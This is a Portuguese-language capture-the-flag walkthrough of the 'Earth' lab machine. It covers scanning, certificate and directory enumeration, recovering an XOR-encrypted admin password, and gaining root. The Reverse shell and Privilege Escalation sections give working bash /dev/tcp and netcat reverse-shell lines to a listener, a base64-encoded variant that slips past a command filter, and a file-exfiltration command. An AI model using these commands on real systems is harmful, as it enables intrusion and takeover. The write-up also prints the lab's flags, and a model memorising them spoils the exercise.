# Host Discovery

Antes de mais nada, podemos fazer um host discovery com o arp-scan

Como estamos numa rede 192.168.56.0/24, temos de fazer um arp-scan para essa rede

```bash
sudo arp-scan --interface=eth1 192.168.56.0/24
```

a saída seria algo assim:

```bash
─$ sudo arp-scan --interface=eth1 192.168.56.0/24 
Interface: eth1, type: EN10MB, MAC: 08:00:27:34:83:16, IPv4: 192.168.56.1 
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied 
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied 
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 
192.168.56.11 08:00:27:97:46:d9 (Unknown) 
1 packets received by filter, 0 packets dropped by kernel 
Ending arp-scan 1.10.0: 256 hosts scanned in 1.940 seconds (131.96 hosts/sec). 
1 responded
```

Veja que o IP da máquina é 192.168.56.11. Com isso, já podemos fazer um information gathering.

# Information Gathering

## 1. Obtendo o código fonte da página (se é que tem alguma página)

```bash
curl -s http://192.168.56.12
```

A partir disso, podemos ver uma saída assim:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://192.168.56.12

<!doctype html>
<html lang="en">
<head>
  <title>Bad Request (400)</title>
</head>
<body>
  <h1>Bad Request (400)</h1><p></p>
</body>
</html>
```

Boas notícias, parece que a máquina tá rodando um webserver

Agora, podemos verificar o código fonte da página do servidor SSL:

```bash
curl -s https://192.168.56.12
```

Não vai retornar nada, possivelmente pq o certificado é inválido


## 1.2 Verificando se a máquina está rodando um servidor SSL

Podemos simplesmente abrir o navegador e tentar abrir https://192.168.56.12

Se aparecer algo sobre risco de entrar na página, então a máquina está rodando um servidor SSL.
Com isso, podemos verificar o certificado SSL do servidor:

```bash
openssl s_client -connect 192.168.56.12:443
```

Com isso, obtemos a seguinte saída:

```bash
┌──(kali㉿kali)-[~]
└─$ openssl s_client -connect 192.168.56.12:443 
Connecting to 192.168.56.12
CONNECTED(00000003)
Can\'t use SSL_get_servername
depth=0 ST=Space, L=Milky Way, CN=earth.local
verify error:num=18:self-signed certificate
verify return:1
depth=0 ST=Space, L=Milky Way, CN=earth.local
verify return:1
---
Certificate chain
 0 s:ST=Space, L=Milky Way, CN=earth.local
   i:ST=Space, L=Milky Way, CN=earth.local
   a:PKEY: RSA, 4096 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Oct 12 23:26:31 2021 GMT; NotAfter: Oct 10 23:26:31 2031 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFhjCCA26gAwIBAgIUZZZYScVhllOGdJWBnhMx5ztnlkcwDQYJKoZIhvcNAQEL
BQAwOjEOMAwGA1UECAwFU3BhY2UxEjAQBgNVBAcMCU1pbGt5IFdheTEUMBIGA1UE
AwwLZWFydGgubG9jYWwwHhcNMjExMDEyMjMyNjMxWhcNMzExMDEwMjMyNjMxWjA6
MQ4wDAYDVQQIDAVTcGFjZTESMBAGA1UEBwwJTWlsa3kgV2F5MRQwEgYDVQQDDAtl
YXJ0aC5sb2NhbDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMqFZz4K
O71xGgMvMuvefKWV4oZtq4qz6Y+Jq6nQ03zyZEsNSuGsKlBmZM54+hUGyNOOUScd
PL4kUBX0uMujUxq1XKceeg5gJ/kMEAKbe8bqzyN/tPNJ4aCM00fryP/+zDR9fSFZ
lGF3Xd+pmvLZz+D4CLVJDe5sEVoXIdtlg338gDVrCfkFUzl1uDTB4kPmLPu60LUP
4FNUWb2FY2HgQcHIIn6HuQ7GhHVnuNbfPn0PCX5ugGC9XxQq8XzwZs51bprdTU8x
KaPkQKIJ60sGIS1xzgiLH5s2hkX5LW5u9V2mwqQ4CNS4FFMAbZl66NqPU08OuFau
HLp/NDdixZPequLZGjIS/JjfYkNKHElzoMgLk5qvqFt9YpPX4ktfGteX8TsfF+pP
ZdcudBC6BbODNTc+Wr+wLKe9OLZo1/EfJqHUH0h0Jwcrdfr/zOc77GzYhsdkSdiY
GXZy48BkVV/kmWsMDK6W5Cs2rJx5DmC7ugt14KkzYv6Vv/o5uUtJjRypBjQ/htmR
oo5mcKGaiohwCfR7T/lL1lA0Tq+cDYwATadudMQ8dgRmf099HO2iFXG4nqE+nacC
ezfDR8qTXZDUaoTWUFAxI6Bp4M3BCae6x9S+LM6KF6ZoNZ4VroYDD/iub16Ci1FP
biz6gaBX9iA/tBH6ubcW2V39EHgIswhwR0RtAgMBAAGjgYMwgYAwHQYDVR0OBBYE
FCX2FKvs/3HZedJN9wbc5w/o884/MB8GA1UdIwQYMBaAFCX2FKvs/3HZedJN9wbc
5w/o884/MA8GA1UdEwEB/wQFMAMBAf8wLQYDVR0RBCYwJIILZWFydGgubG9jYWyC
FXRlcnJhdGVzdC5lYXJ0aC5sb2NhbDANBgkqhkiG9w0BAQsFAAOCAgEAmOynGBnK
GaLm68D50Xd0mKJlyjpHrI1I97btr7iNKa0UOfSBOutDPyN51j2ibyG/Eq9lVyS3
DUEzG3PezGOP0EI8mmT92CqkPfc3+R6NL0q/+tszxgGPPmy66T8L/o+nHgUCrDbO
Ypa8DPhha7HFIVhlJC49PJI9/M8r6UqrJEWW1lJSSd3uSxyfrbt5YkxBAsaJQ9w5
RgnAYYr4v/a+icwzNov9YdW2mqGl0NuKh6henh+T+4ctAz3aLsUL2rJni17/Tp1q
6cxFkoNbbN6vTG7GjC0Mtqukbn9JIIfvWXQf7xWVIJIkvedhMDoikYE0tTeM8Vkz
GngVRaziwCRdG4ur8ZztqHXMemhQ+TVqxOobTgc1NDIoMjhF1xwfbh2lSi/5px3/
iN3D80mJ32x19p8/A+b9dk1kMWTfT46FBrl3UeF4VgzLVsVL2QQWNDZmzo0d4k7B
Fn8Uzyzj7Tr1/R0oEL2Z75z2mZV9uClek7OLSarXFVQQOVgyXRbhG3+Q1AtVndur
IdII4FThlEP3jnSAEin1dnKgsuGjz+8olmsyqu9p0xkv3iVvM1ErD/TnNUhAZGou
ScfxACsYU2ZX8XKF/QyS35pgkR6/zJGashm/M9MMV8NN1AkhoQ0CwFzCcrQsGZjd
S6cvQe6K0mUe4pdZwTYd2T0de4jpofXbWms=
-----END CERTIFICATE-----
subject=ST=Space, L=Milky Way, CN=earth.local
issuer=ST=Space, L=Milky Way, CN=earth.local
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 2230 bytes and written 1740 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 4096 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 8B2A211DB7D078C3A96F12294200DE0A02B77F1278EF00FEF45DAA8FE396E6C7
    Session-ID-ctx: 
    Resumption PSK: 0067F73F8FF8BFF1FA3BA631A554AD0F9A39D1B4675626B72FB6D020A83836EFF8CE6443D57F61F679DA446DF173904E
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - cf e4 e5 a4 23 cb 6a d9-5b 08 b0 dd c2 65 b3 69   ....#.j.[....e.i
    0010 - 80 1e ab 83 0a 21 12 26-79 59 ce 37 d1 97 cf 8e   .....!.&yY.7....
    0020 - 00 9a 34 a4 36 ed d4 e3-90 1e 5c 70 00 07 e7 b3   ..4.6.....\p....
    0030 - 81 b4 4d 48 6c 79 67 d3-a4 76 eb f2 96 6b e5 d9   ..MHlyg..v...k..
    0040 - b8 03 cc 48 64 27 c7 03-a3 c5 46 f6 b5 2a 01 72   ...Hd\'....F..*.r
    0050 - 80 1a f6 b4 ae 9c 3e 6d-8f 12 a6 8b 5a 08 99 c8   ......>m....Z...
    0060 - 19 db c8 e0 d4 07 3a 92-40 e9 8f 19 48 bb e3 3d   ......:.@...H..=
    0070 - 72 6e 03 a7 ab 8b 35 5b-16 ac 29 72 bb 46 36 4d   rn....5[..)r.F6M
    0080 - b1 42 c4 37 16 67 e0 20-a7 ce e3 0d c1 6d 16 8c   .B.7.g. .....m..
    0090 - 6d 53 d7 3c 81 5b f7 24-fe c4 73 c6 07 08 ac 60   mS.<.[.$..s....`
    00a0 - ef 39 86 da 3c 1a a7 51-18 23 bd fd 58 96 3c 9f   .9..<..Q.#..X.<.
    00b0 - 9d 2c 64 e6 21 32 34 93-5c bd 2b 87 7f d2 31 5d   .,d.!24.\.+...1]
    00c0 - a5 88 bc 43 02 7a a5 75-1a ab d7 4b db 58 69 d4   ...C.z.u...K.Xi.
    00d0 - dd 46 c8 41 14 9c 3c f8-1f a4 e9 b3 ce 23 7b 9f   .F.A..<......#{.

    Start Time: 1752266013
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
```

Coisas importantes a se notar:

### Common Name (CN)

```bash
depth=0 ST=Space, L=Milky Way, CN=earth.local
```

Repare o common name **earth.local**. Provavelmente o nome da máquina, então, podemos adicionar isso em /etc/hosts:

```/etc/hosts
192.168.56.12     earth.local
```


### Verificando o Subject Alternative Name (SANs) no certificado

```bash
openssl s_client -connect 192.168.56.12:443 -servername 192.168.56.12 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
```

Segue a saída esperada:

```bash
X509v3 Subject Alternative Name:
	DNS:earth.local, DNS: terratest.earth.local
```

Com isso, podemos testar:

http://earth.local
https://terratest.earth.local

# Enumeration

## Enumerando paths no site

Para enumerar paths no site, podemos usar o dirb:

```bash
dirb http://earth.local
```

Aqui, encontramos 2 diretórios:

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://earth.local           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jul 11 22:05:27 2025
URL_BASE: http://earth.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://earth.local/ ----
                                                                             + http://earth.local/admin (CODE:301|SIZE:0)                                
+ http://earth.local/cgi-bin/ (CODE:403|SIZE:199)                           
                                                                               
-----------------
END_TIME: Fri Jul 11 22:05:50 2025
DOWNLOADED: 4612 - FOUND: 2

```

/cgi-bin/ quer dizer que o servidor possui um interpretador de comandos... ou seja, ele permite que, em algum lugar do site, o usuário digite comandos para o servidor.

```bash
dirb https://terratest.earth.local
```

Aqui, podemos ver que encontramos alguns caminhos e arquivos:

```bash
┌──(kali㉿kali)-[~]
└─$ dirb https://terratest.earth.local

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jul 11 22:02:38 2025
URL_BASE: https://terratest.earth.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: https://terratest.earth.local/ ----
                                                                             + https://terratest.earth.local/cgi-bin/ (CODE:403|SIZE:199)                
+ https://terratest.earth.local/index.html (CODE:200|SIZE:26)               
+ https://terratest.earth.local/robots.txt (CODE:200|SIZE:521)              
                                                                               
-----------------
END_TIME: Fri Jul 11 22:02:54 2025
DOWNLOADED: 4612 - FOUND: 3

```

O robots.txt é muito interessante, pois é a lista de arquivos/diretórios que o site não indexou, ou seja, quer aparentemente manter em sigilo.

Ao navegarmos para https://terratest.earth.local/robots.txt, podemos ver um arquivo disallow testingnotes.txt e é esse arquivo que iremos ver.

Conteúdo do arquivo:

```testingnotes.txt
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
Aqui, podemos ver que eles usaram o algoritmo XOR para encriptar as mensagens que estão no index de earth.local
Podemos ver também que há um arquivo testdata.txt e que o conteúdo dele foi usado para testar a encriptação.
Outra coisa muito importante é que **terra** é o username do **admin**.

Agora, vamos tentar ver o conteúdo das mensagens que estão em earth.local.

Para isso, usaremos o site https://gchq.github.io/CyberChef/
Lá colocamos os "ingredientes" From Hex e algoritmo XOR.
A key, usaremos o conteúdo de testdata.txt e estaremos como input todas as mensagens que estão em earth.local até vermos algo que faça sentido e que tenha algum significado.

# Gaining access

Uma das mensagens contém o texto *earthclimatechangebad4humans* repetidamente... usaremos isso como senha do admin e *voilá*.

Agora, vem a parte divertida. Poderemos enviar comandos para o servidor remotamente.
Podemos começar com ls

```bash
ls -la
```

Podemos ver que estamos em /... Agora, podemos dar um find para encontrar arquivos .txt para ver se encontramos arquivos de log ou anotações.

```bash
find / -name '*.txt'
```

Olha que legal. Encontramos a primeira flag desse CTF. /var/earth_web/user_flag.txt

```bash
cat /var/earth_web/user_flag.txt
```


## Reverse shell

O próximo passo agora é tentarmos acesso de root, pois se formos dar um whoami, veremos que somos o usuário apache.
Para fazermos isso, precisamos de um reverse shell. Temos algumas opções. Colocarei duas aqui

Primeiramente, para sabermos o bash disponível:

```bash
which bash
```

```bash
/usr/bin/bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
```

ou

```bash
nc -e /bin/bash 192.168.56.1 4444
```

E na nossa máquina temos de estar ouvindo a porta 4444 com netcat:

```bash
nc -lnvp 4444
```

Mas isso não vai dar certo e tomaremos **Remote connections are forbidden.**
Para contornar, codificaremos para base64 o nosso comando, ficando assim:

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvNDQ0NCAwPiYxJwo= (Primeira opção)

Sendo assim, copiaremos e colaremos o seguinte no campo de comando do site:

echo 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvNDQ0NCAwPiYxJwo=' | base64 -d | bash

e voilá... obtivemos o reverse shell

# Privilege Escalation

O próximo passo é procurar uma escalação de privilégio

Primeiro, procuraremos por uma permissão de root em arquivos... De novo, usaremos o comando find para isso.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Como saída, temos:

```bash
bash-5.1$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/reset_root
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
```

De todos os arquivos, o **/usr/bin/reset_root** parece mais promissor.

Se dermos um cat nele, não vamos conseguir ler muita coisa, pois é binário.
Para isso, teremos que mandar uma cópia desse arquivo para a nossa máquina.
Sendo assim, abriremos outro socket com o netcat em uma outra porta.

```bash
nc -lnvp 3333 > reset_root
```

na outra aba, temos que enviar o reset_root para a nossa máquina:

```bash
cat /usr/bin/reset_root > /dev/tcp/192.168.56.1/3333
```

Agora, temos o arquivo na nossa máquina.
Para analisar a execução de um binário, podemos usar uma ferramenta chamada **ltrace**.

```bash
ltrace ./reset_root
```

Como saída, obteremos isso:

```bash
┌──(kali㉿kali)-[~]
└─$ ltrace ./reset_root
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)    = 38
access("/dev/shm/kHgTFI5G", 0)                 = -1
access("/dev/shm/Zw7bV9U5", 0)                 = -1
access("/tmp/kcM0Wewe", 0)                     = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)    = 44
+++ exited (status 0) +++

```

Veja que esse executável acessa três arquivos. Vou criar esses três arquivos e executar o reset_root de novo.

```bash
bash-5.1$ touch /dev/shm/kHgTFI5G
touch /dev/shm/kHgTFI5G
bash-5.1$ touch /dev/shm/Zw7bV9U5
touch /dev/shm/Zw7bV9U5
bash-5.1$ touch /tmp/kcM0Wewe
touch /tmp/kcM0Wewe
```

```bash
bash-5.1$ /usr/bin/reset_root
```

Como saída, temos algo muito bom:

```bash
bash-5.1$ /usr/bin/reset_root
/usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth

```
a senha do root foi resetada. Agora, só precisamos logar como root

```bash
su root
```

E chegamos ao fim do desafio:

```bash
bash-5.1$ su root
su root
Password: Earth
whoami
root
ls /root
anaconda-ks.cfg
root_flag.txt
cat /root/root_flag.txt

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```
